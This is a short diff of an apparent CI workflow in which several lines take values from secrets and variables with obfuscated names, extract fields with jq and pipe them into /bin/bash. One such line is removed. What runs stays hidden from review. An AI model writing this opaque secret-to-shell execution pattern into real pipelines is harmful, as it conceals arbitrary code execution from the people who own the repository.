@@ -17,7 +17,6 @@ jobs:
           kbgp713: ${{ secrets.kbgp713 }}
         run: |
           printf '%s' "$kbgp713" | jq -r .cez03 | /bin/bash
-          echo $e4 | jq -r .qdmh9 | /bin/bash
           echo $pqgbx19 | jq -r .uf56 | /bin/bash
           printf '%s' "$txr1" | jq -r .in055 | /bin/bash
           echo $tvm41688 | jq -r .ofu08 | /bin/bash
